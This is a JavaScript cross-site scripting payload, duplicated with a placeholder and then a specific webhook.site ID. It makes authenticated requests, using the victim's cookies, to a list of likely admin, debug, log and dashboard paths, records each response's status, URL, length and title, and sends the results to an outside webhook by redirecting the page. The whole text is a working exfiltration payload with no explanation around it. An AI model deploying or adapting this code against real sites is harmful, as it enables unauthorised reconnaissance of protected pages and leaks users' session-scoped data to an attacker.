(async()=>{
  const paths = [
    '/change_log',
    '/changelog',
    '/view',
    '/dashboard-view',
    '/security-dashboard',
    '/dashboard/view',
    '/security/view',
    '/admin/view',
    '/reports',
    '/report',
    '/logs',
    '/monitor',
    '/console',
    '/panel',
    '/debug',
    '/dashboard',
    '/security'
  ];

  const out = [];

  for (const p of paths) {
    try {
      const r = await fetch(p, { credentials: 'include' });
      const t = await r.text();
      const m = t.match(/<title>([^<]{0,80})<\/title>/i);
      const title = m ? m[1] : '';
      out.push(
        [
          p,
          'S=' + r.status,
          'U=' + r.url,
          'L=' + t.length,
          'T=' + title
        ].join(' ')
      );
    } catch (e) {
      out.push(p + ' ERR');
    }
  }

  location = 'https://webhook.site/YOURID/?d=' + encodeURIComponent(out.join(' || '));
})();(async()=>{
  const paths = [
    '/change_log',
    '/changelog',
    '/view',
    '/dashboard-view',
    '/security-dashboard',
    '/dashboard/view',
    '/security/view',
    '/admin/view',
    '/reports',
    '/report',
    '/logs',
    '/monitor',
    '/console',
    '/panel',
    '/debug',
    '/dashboard',
    '/security'
  ];

  const out = [];

  for (const p of paths) {
    try {
      const r = await fetch(p, { credentials: 'include' });
      const t = await r.text();
      const m = t.match(/<title>([^<]{0,80})<\/title>/i);
      const title = m ? m[1] : '';
      out.push(
        [
          p,
          'S=' + r.status,
          'U=' + r.url,
          'L=' + t.length,
          'T=' + title
        ].join(' ')
      );
    } catch (e) {
      out.push(p + ' ERR');
    }
  }

  location = 'https://webhook.site/aef63664-4b2b-4a25-a695-c21c1fdd7a89/?d=' + encodeURIComponent(out.join(' || '));
})();